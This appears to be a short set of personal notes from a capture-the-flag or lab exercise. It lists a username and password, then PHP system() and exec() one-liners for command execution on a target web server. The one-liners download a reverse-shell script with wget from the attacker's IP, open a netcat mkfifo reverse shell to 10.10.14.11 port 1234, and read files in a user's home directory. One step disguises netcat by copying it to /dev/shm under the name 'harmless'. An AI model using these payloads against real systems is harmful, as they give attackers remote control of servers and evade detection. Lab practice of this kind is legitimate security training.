**admin**
**skoupidotenekes**

**For testing:**
```shell
<?php system('ls -lah') ?>
??
<?php exec('wget http://10.10.14.11/revshell.php') ?>
```
**Try but fail:**
```shell
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.11 1234 >/tmp/f') ?>

<?php system('ls -lah /home/xalvas') ?>


<?php system('cat /home/xalvas/intrusions') ?> 
```
**COPY nc Method:**
```shell
<?php system('which nc') ?>

<?php system('cp /bin/nc /dev/shm/harmless') ?> 
<?php system('chmod +x /dev/shm/harmless') ?>
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/dev/shm/harmless 10.10.14.11 1234 >/tmp/f') ?>
```